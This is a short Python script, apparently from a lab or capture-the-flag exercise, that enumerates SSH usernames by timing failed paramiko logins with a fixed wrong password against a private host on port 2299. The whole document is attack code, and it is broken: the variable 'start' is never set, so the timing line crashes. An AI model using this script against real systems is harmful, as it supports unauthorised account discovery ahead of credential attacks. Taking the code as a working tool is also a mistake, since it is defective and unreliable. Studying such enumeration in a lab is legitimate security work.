```python
import paramiko
import time

users = open('userlist.txt').read().splitlines()

for user in users:

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect('172.10.0.3', port=2299, username=user, password='wrongpass', timeout=5)
    except paramiko.AuthenticationException:
        pass
    except:
        pass
    end = time.time()
    print(f'{user}: {end-start:.2f}s')
```
